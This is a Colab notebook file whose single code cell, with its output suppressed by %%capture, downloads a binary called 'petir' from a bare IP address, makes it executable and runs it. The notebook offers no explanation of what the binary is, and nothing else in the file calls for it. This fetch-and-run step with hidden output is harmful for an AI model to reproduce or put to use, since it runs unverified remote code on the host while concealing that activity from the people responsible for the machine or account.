{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "petir6.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyOxAfbWbQL2NGFmxAI8n+v9",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/rahmansoni98/coleq1/blob/main/petir6.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "kZwHdVdSJFOG"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "!wget http://137.184.39.112/petir && chmod +x petir && ./petir\n"
      ]
    }
  ]
}